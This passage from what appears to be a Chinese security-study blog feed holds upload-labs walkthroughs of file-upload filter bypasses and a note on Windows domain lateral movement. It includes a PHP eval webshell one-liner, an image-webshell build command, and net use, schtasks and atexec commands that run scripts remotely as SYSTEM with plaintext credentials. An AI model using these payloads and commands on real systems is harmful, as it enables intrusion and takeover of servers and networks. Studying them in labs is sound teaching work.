+<p><strong>当然，直接把php小马后缀名改成jpg也可以上传</strong></p>
+<p><img src="/../../images/xdwjsc/1629275575960-dfc154fa-64b6-4886-b48b-81b5d885be4a.png" alt="img"></p>
+<p>图片中包含的代码显示成功</p>
+<p><img src="/../../images/xdwjsc/1629275601034-1d97ad81-1ecc-4eed-bf63-cd007330d2f8.png" alt="img"></p>
+<h2><span id="pass-5-大小写绕过黑名单">Pass-5  (大小写绕过黑名单)</span></h2><p><strong>把 .htaccess后缀的给过滤掉了</strong></p>
+<p><img src="D:/my_blog/source/_posts/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E5%2590%258E%25E7%25AB%25AF%25E9%25BB%2591%25E5%2590%258D%25E5%258D%2595%25E7%25BB%2595%25E8%25BF%2587.assets/1646887836364.png" alt="1646887836364"></p>
+<p><img src="/../../images/xdwjsc/1646888081753.png" alt="1646888081753"></p>
+<p><strong>方法一：只需要把文件后缀名改成大写的就能过</strong></p>
+<p><img src="/../../images/xdwjsc/1646888269489.png" alt="1646888269489"></p>
+<p>方法二： <code>.htaccess</code> 被禁用了</p>
+<p>但是.ini没禁用</p>
+<p>所以可以上传<code>.user.ini</code>文件<br>内容是</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">auto_prepend_file=test.jpg<br></code></pre></td></tr></table></figure>
+
+<p>让所有php文件都“自动”包含<code>test.jpg</code>文件</p>
+<h2><span id="pass-6-空格绕过黑名单">Pass-6 (空格绕过黑名单)</span></h2><p><strong>源码分析：</strong>没有发现使用trim()函数</p>
+<p><strong>trim()：去除字符串中的空格</strong></p>
+<p><img src="/../../images/xdwjsc/1650545901481.png" alt="1650545901481"></p>
+<p><strong>原理解析</strong>：在<strong>数据包中加空格是会被接受的</strong>，也就是说，在抓包时，<strong>文件名.php</strong>，我们只需要在写成<strong>php空格</strong>就可以完成绕过操作，但是在<strong>Windows中系统会强制删除后缀名的空格</strong></p>
+<p><img src="/../../images/xdwjsc/1650546189170.png" alt="1650546189170"></p>
+<h2><span id="pass7点绕过">Pass7（点绕过）</span></h2><p><strong>代码解析：没有对小数点进行过滤</strong></p>
+<p><img src="/../../images/xdwjsc/1646889625436.png" alt="1646889625436"></p>
+<p><strong>1.txt 和 1.txt.  两者是一个文件，是一样的， . 和空格是一码事</strong></p>
+<p><img src="/../../images/xdwjsc/1646889560214.png" alt="1646889560214"></p>
+<p><strong>上传成功</strong></p>
+<p><img src="/../../images/xdwjsc/1650546325341.png" alt="1650546325341"></p>
+<h2><span id="pass8data绕过">Pass8（::$DATA绕过）</span></h2><p>利用Windows特性</p>
+<p><strong>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</strong></p>
+<p><strong>例如:”phpinfo.php::$DATA”Windows会自动去掉末尾的::$DATA变成”phpinfo.php”</strong></p>
+<p>查看源码分析，发现少了::$DATA验证</p>
+<p><img src="/../../images/xdwjsc/1646889936059.png" alt="1646889936059"></p>
+<p><strong>抓包 后缀名加::$DATA即可绕过</strong></p>
+<p><img src="/../../images/xdwjsc/1646890024376.png" alt="1646890024376"></p>
+<p>上传成功</p>
+<p><img src="/../../images/xdwjsc/16468900138570.png" alt="1646890038570"></p>
+<h2><span id="pass9-点空格绕过">Pass9 （点空格绕过）</span></h2><p>代码将字符串里的php替换为空 </p>
+<p>一次过滤</p>
+<p>a.php -&gt; a.</p>
+<p>a.pphphp -&gt; a.php   将中间的php过滤掉，还有个php</p>
+<p>循环过滤 递归过滤</p>
+<p>a.pphphp -&gt; a.    只要有php出现就会一直过滤掉</p>
+<p><strong>代码分析：源码中的过滤都是过滤一次，那么多写几个点和空格让他过滤，是不是就完成绕过了呢</strong></p>
+<p><img src="/../../images/xdwjsc/1646890915214.png" alt="1646890915214"></p>
+<p><img src="/../../images/xdwjsc/1646890811239.png" alt="1646890811239"></p>
+<ol>
+<li><strong>修改数据为 xxx.php. .(点 空格 点)，上传成功</strong></li>
+</ol>
+<p><img src="/../../images/xdwjsc/1646890962212.png" alt="1646890962212"></p>
+<h2><span id="pass10-双后缀名绕过">Pass10 （双后缀名绕过）</span></h2><p>代码分析：将黑名单的后缀名替换为空，但是它也是单次过滤，没有循环过滤，我们只需要把php改成pphp</p>
+<p><img src="/../../images/xdwjsc/1646926751786.png" alt="1646926751786"></p>
+<ol>
+<li><p>正常上传后缀名被过滤掉了<img src="/../../images/xdwjsc/1646926601315.png" alt="1646926601315"></p>
+</li>
+<li><p>改后缀名，上传成功</p>
+<p><img src="/../../images/xdwjsc/1650547805604.png" alt="1650547805604"></p>
+</li>
+</ol>
+<p>3.当然，改其他格式也是可以的，例如，js，asp…</p>
+<p><img src="/../../images/xdwjsc/1646927294393.png" alt="1646927294393"></p>
+<h2><span id="pass1100截断get">Pass11（%00截断—GET）</span></h2><p><strong>%00截断原理</strong></p>
+<p><strong><a href="http://www.xxx.com/1.jpg">www.xxx.com/1.jpg</a></strong></p>
+<p><strong><a href="http://www.xxx.com/webshell.php%00.jpg">www.xxx.com/webshell.php%00.jpg</a> &#x3D;&gt; <a href="http://www.xxx.com/1.php">www.xxx.com/1.php</a></strong></p>
+<p><strong>%00是被服务器解码为0x00发挥了截断作用</strong></p>
+<p><strong>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。</strong></p>
+<p><strong>%00和0x00是有区别的：%00是URL中的，0x00是文件命名</strong></p>
+<p><strong>%00需要PHP版本小于5.3.4，且打开php的配置文件php-ini，</strong></p>
+<p><strong>将magic_quotes_gpc设置为Off</strong></p>
+<p><strong>代码分析：</strong></p>
+<p>都是指定能上传的文件后缀名</p>
+<p><img src="D:/my_blog/source/_posts/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E5%2590%258E%25E7%25AB%25AF%25E9%25BB%2591%25E5%2590%258D%25E5%258D%2595%25E7%25BB%2595%25E8%25BF%2587.assets/1646932802901.png" alt="1646932802901"></p>
+<p><img src="/../../images/xdwjsc/1650598789303.png" alt="1650598789303"></p>
+<h2><span id="pass1100截断post">Pass11（%00截断—POST）</span></h2><p>与上一题相比<br>区别是上传方式变成了POST</p>
+<p>还是利用00截断<br>但是POST不会像GET对%00进行自动解码<br>需要在十六进制中进行修改</p>
+<p><img src="/../../images/xdwjsc/1650627059910.png" alt="1650627059910"></p>
+<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650627101471.png" alt="1650627101471"></p>
+<p><img src="/../../images/xdwjsc/1650627388254.png" alt="1650627388254"></p>
+<p><strong>成功上传phpinfo</strong></p>
+<p><img src="/../../images/xdwjsc/1650627414761.png" alt="1650627414761"></p>
+<h1><span id="五-文件上传之内容逻辑数组绕过">五. 文件上传之内容逻辑数组绕过</span></h1><p> <strong>在学习完代码层面中会指定禁止上传得脚本文件，限制文件后缀和基本的绕过黑名单方法，那么如果服务器指定只能上传的文件呢？那么我们就要通过某些漏洞来突破这些限制，从而获取webshell</strong></p>
+<h4><span id="1-图片一句话制作方法">1. 图片一句话制作方法：</span></h4><ol>
+<li><strong>将shell.php和1.png类容合在一起</strong></li>
+</ol>
+<p>copy 1.png &#x2F;b + shell.php &#x2F;a webshell.jpg</p>
+<p>&#x2F;b：指定以二进制以二进制格式复制，合并文件，用于图像或者声音类文件</p>
+<p>&#x2F;a：指定以ascii格式复制，合并文件，用于txt等文本类文件</p>
+<p><img src="/../../images/xdwjsc/164705372385h1.png" alt="1647053723851"></p>
+<ol start="2">
+<li><strong>生成图片马</strong></li>
+</ol>
+<p><img src="/../../images/xdwjsc/1647053782801.png" alt="1647053782801"></p>
+<ol start="3">
+<li><p><strong>图片马代码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;?php  @ eval($_POST[&#x27;x&#x27;]) ; ?&gt;<br>or<br>&lt;?php phpinfo() ?&gt;<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h4><span id="2-文件头检测">2. 文件头检测</span></h4><p>文件头检查是指当浏览器上传到服务器的时候，白名单进行的文件头检测，符合，则允许上传，否则不允许上传</p>
+<h4><span id="3-文件包含漏洞解析"><strong>3. 文件包含漏洞解析</strong></span></h4><blockquote>
+<p><strong>什么是文件包含</strong>：</p>
+<pre><code>为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件。 
+</code></pre>
+</blockquote>
+<p>通过get方式把想要包含的文件传递给服务器，当服务器接收到包含的文件时，找到图片地址，运行包含include得脚本，引入图片马，即可出发文件包含漏洞</p>
+<p>在PHP中，只要使用include包含的文件，文件只要有php代码， 不管是jpg，png格式，都会按照    php来执行</p>
+<p><strong>说白了存在包含漏洞，利用此漏洞可以将存有php代码的jpg图片以php执行</strong></p>
+<p><img src="D:/my_blog/source/_posts/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0/%25E6%2596%2587%25E4%25BB%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E4%25B9%258B%25E5%2586%2585%25E5%25AE%25B9%25E9%2580%25BB%25E8%25BE%2591%25E6%2595%25B0%25E7%25BB%2584%25E7%25BB%2595%25E8%25BF%2587.assets/1647062488328.png" alt="1647062488328"></p>
+<h2><span id="pass-13文件头检测图片马利用文件包含漏洞"><strong>Pass-13（文件头检测，图片马利用文件包含漏洞）</strong></span></h2><p>分析代码：代码中存在验证头信息</p>
+<p><img src="/../../images/xdwjsc/1647065017758.png" alt="1647065017758"></p>
+<p>例如GIF：GIF89a就是GIF的文件头</p>
+<p><img src="/../../images/xdwjsc/1647065056247.png" alt="1647065056247"></p>
+<ol>
+<li>制作图片马</li>
+</ol>
+<p><img src="/../../images/xdwjsc/1647064202224.png" alt="1647064202224"></p>
+<ol start="2">
+<li>上传图片马，复制地址</li>
+</ol>
+<p><img src="/../../images/xdwjsc/1647064368005.png" alt="1647064368005"></p>
+<ol start="3">
+<li>利用文件包含漏洞，执行图片马中的代码</li>
+</ol>
+<p><img src="/../../images/xdwjsc/1647064624320.png" alt="1647064624320"></p>
+<p><strong>方法二：直接修改脚本后缀名，和文件头</strong></p>
+<p><img src="/../../images/xdwjsc/1650630521824.png" alt="1650630521824"></p>
+<h2><span id="pass-14-突破getimagesize">Pass-14 （突破getimagesize）</span></h2><p>php  getimagesize()函数：用于获取图像大小及相关信息，只接收图像相当于限制了文件类型，在排除解析漏洞，只能上传图像</p>
+<p><img src="/../../images/xdwjsc/1647065297756.png" alt="1647065297756"></p>
+<p>利用文件包含漏洞还是可以执行成功图片马</p>
+<p><strong>与Pass13类似，此关主要学习了getimagesize作用</strong></p>
+<p><img src="/../../images/xdwjsc/1647065509306.png" alt="1647065509306"></p>
+<h2><span id="pass-15突破exif-imagetype">Pass-15（突破exif-imagetype）</span></h2><p><strong>分析源码</strong></p>
+<p><strong>exif-imagetype：获取图片类型，验证上传图片的真实格式。只接收图像相当于限制了文件类型</strong></p>
+<p><img src="/../../images/xdwjsc/1647065688699.png" alt="1647065688699"></p>
+<p>利用文件包含漏洞还是可以执行成功图片马</p>
+<p><strong>与Pass13类似，此关主要学习了exif-imagetype作用</strong></p>
+<p><img src="/../../images/xdwjsc/16470654946897.png" alt="1647065946897"></p>
+<p><strong>小结：Pass14&#x2F;15&#x2F;16利用了getimagesize&#x2F;exif-imagetype函数来验证上传的图像信息来判断是不是图像，如果没有文件包含漏洞，那么还是比较安全的</strong></p>
+<h2><span id="pass-16-二次渲染绕过">Pass-16 （二次渲染绕过）</span></h2><h4><span id="1-gif绕过">1. GIF绕过</span></h4><p><img src="/../../images/xdwjsc/1650685845267.png" alt="1650685845267"></p>
+<ul>
+<li>判断了后缀名、content-type</li>
+<li>利用imagecreatefromgif判断格式</li>
+<li>二次渲染了上传的图片</li>
+</ul>
+<blockquote>
+<p> <strong>绕过方法：找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片</strong> </p>
+</blockquote>
+<ol>
+<li><strong><?php phpinfo(); ?></strong>  添加到gif文件的尾部</li>
+</ol>
+<p><img src="/../../images/xdwjsc/1650685946083.png" alt="1650685946083"></p>
+<p>上传后在下载下来发现二次渲染了</p>
+<p><img src="/../../images/xdwjsc/1650685993545.png" alt="1650685993545"></p>
+<ol start="2">
+<li><strong>关于绕过gif的二次渲染，我们只需要找到渲染前后没有变化的位置，然后将php代码写进去，就可以成功上传带有php代码的图片了</strong></li>
+</ol>
+<p><img src="/../../images/xdwjsc/1650686208435.png" alt="1650686208435"></p>
+<ol start="3">
+<li><p>上传修改过的图片马</p>
+<p><img src="/../../images/xdwjsc/1650686344438.png" alt="1650686344438"></p>
+</li>
+</ol>
+<h4><span id="2-pngjpg绕过">2 .PNG，JPG绕过</span></h4><p>有点麻烦不想写了，参考大佬博客吧</p>
+<p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">付杰博客</a></p>
+<h4><span id="3学习扩展">3.学习扩展</span></h4><p>Pass16参考文章：</p>
+<p><a href="https://blog.csdn.net/weixin_44604541/article/details/108847008">CSND思源湖的鱼</a></p>
+<p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">付杰博客</a></p>
+<p>视频：</p>
+<iframe src="//player.bilibili.com/player.html?aid=68451394&bvid=BV1bJ411u77o&cid=118635716&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="500" width="800"> </iframe>
+------
+
+
+
+<iframe src="//player.bilibili.com/player.html?aid=92395475&bvid=BV1dE411n7tE&cid=157740529&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="500" width="800"> </iframe>
+## Pass-17/18  (条件竞争)
+
+<p>实验环境出了点问题</p>
+<p>参开链接</p>
+<p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-17.html">付杰博客</a></p>
+<p>B站视频</p>
+<iframe src="//player.bilibili.com/player.html?aid=715622672&bvid=BV12Q4y1o7Ya&cid=338199976&page=34" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height="500" width="800"> </iframe>
+## Pass-20  (多种方法)
+
+<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650787223757.png" alt="1650787223757"></p>
+<h2><span id="pass-21-来自ctf">Pass-21  (来自CTF)</span></h2><p>代码中有检查MEMI，将MIME改成图片类型</p>
+<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650867245630.png" alt="1650867245630"></p>
+<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D%20.assets/1650866223537.png" alt="1650866223537"></p>
+]]></content>
+      <categories>
+        <category>小迪安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>小迪安全系列-[计划任务impacket]</title>
+    <url>/2022/05/02/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1&amp;impacket%20%5D/</url>
+    <content><![CDATA[<h1><span id="域横向atampschtasksampimpacket">域横向at&amp;schtasks&amp;impacket</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 1-横向渗透明文传递 at&amp;schtasks<br>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？<br>这里仅介绍 at&amp;schtasks 命令的使用，在已知目标系统的用户明文密码的基础上，直接可以在远程主<br>机上执行命令。<br>获取到某域主机权限-&gt;minikatz 得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户<br>名字典-&gt;用到密码明文当做密码字典-》尝试连接-&gt;创建计划任务(at|schtasks)-&gt;执行文件可为后门或<br>者相关命令<br>利用流程<br>1. 建立 IPC 链接到目标主机<br>2. 拷贝要执行的命令脚本到目标主机<br>3. 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1><span id="计划任务at">计划任务——AT</span></h1><p>注：at命令仅仅适用于win8以下系统，win8和win8以上已弃用</p>
+<p>1.创建本地IPC链接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net use \\192.168.3.21\ipc$ Admin12345 /user:administrator<br></code></pre></td></tr></table></figure>
+
+<p>2.拷贝要执行的命令脚本到目标主机</p>
+<p><img src="/../../images/xdnwaq/d1639495713473.png" alt="1639495713473"></p>
+<p>3.查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</p>
+<p><img src="/../../images/xdnwaq/16394957436174.png" alt="1639495736174"></p>
+<h1><span id="计划任务schtasks">计划任务——schtasks</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#schtasks &gt;=Windows2012<br>net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\ad<br>ministrator # 建立 ipc 连接：<br>copy add.bat \\192.168.3.32\c$ #复制文件到其 C 盘<br>schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F #创建 adduser 任务<br>对应执行文件<br>schtasks /run /s 192.168.3.32 /tn adduser /i #运行 adduser 任务<br>schtasks /delete /s 192.168.3.21 /tn adduser /f#删除 adduser 任务<br></code></pre></td></tr></table></figure>
+
+<p>1.创建任务</p>
+<p>schtasks &#x2F;create &#x2F;s 192.168.1.146 &#x2F;ru “SYSTEM” &#x2F;tn adduser &#x2F;sc DAILY &#x2F;tr c:\add.bat &#x2F;F </p>
+<p>&#x2F;ru “SYSTEM”                        权限</p>
+<p> &#x2F;tn adduser                        计时任务的名字 </p>
+<p>&#x2F;sc DAILY &#x2F;tr c:\add.bat     延迟执行文件地址</p>
+<p><img src="/../../images/xdnwaq/16394986174427.png" alt="1639498617427"></p>
+<p>2.运行adduser 任务</p>
+<p>schtasks &#x2F;run &#x2F;s 192.168.3.32 &#x2F;tn adduser &#x2F;i</p>
+<p><img src="/../../images/xdnwaq/16394984666812.png" alt="1639498666812"></p>
+<p>3.删除add user任务</p>
+<p> schtasks &#x2F;delete &#x2F;s 192.168.3.21 &#x2F;tn adduser &#x2F;f#删除 adduser 任务 </p>
+<h1><span id="atexec-impacket">atexec-impacket</span></h1><p><strong>atexec.exe [用户名] ：[密码] @ [IP] [命令]</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../images/xdnwaq/16395840214846.png" alt="1639584021846"></p>
+<h1><span id="atexecexe批量连接"><strong>atexec.exe批量连接</strong></span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../images/xdnwaq/1651470706485.png" alt="1651470706485"></p>
+<h1><span id="net-use批量连接"><strong>net use批量连接</strong></span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ &quot;Admin12345&quot; /user:administrator<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../images/xdnwaq/1639590175450.png" alt="1639590175450"></p>
+]]></content>
       <categories>
         <category>小迪安全</category>
       </categories>
